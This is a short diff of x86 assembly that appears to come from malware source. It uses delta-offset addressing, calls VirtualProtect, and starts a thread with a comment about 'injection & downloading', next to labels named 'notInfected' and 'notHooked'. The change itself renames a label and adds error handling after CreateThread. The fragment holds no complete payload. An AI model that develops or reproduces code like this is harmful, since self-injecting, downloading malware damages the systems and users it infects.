@@ -46,8 +46,7 @@ push	ecx
 call	[DELTA pVirtualProtect]
 popa
 
-
-notInfected:
+notHooked:
 
 ; Create Thread to avoid waiting injection & downloading
 PDELTA	ThreadId
@@ -57,7 +56,8 @@ PDELTA	threadProgram
 push	0
 push	0
 call	[DELTA pCreateThread]
+cmp	eax, NULL
+je	errorExit
+mov	[DELTA ThreadHandle], eax
 
-nop
-nop
-nop
+notInfected:
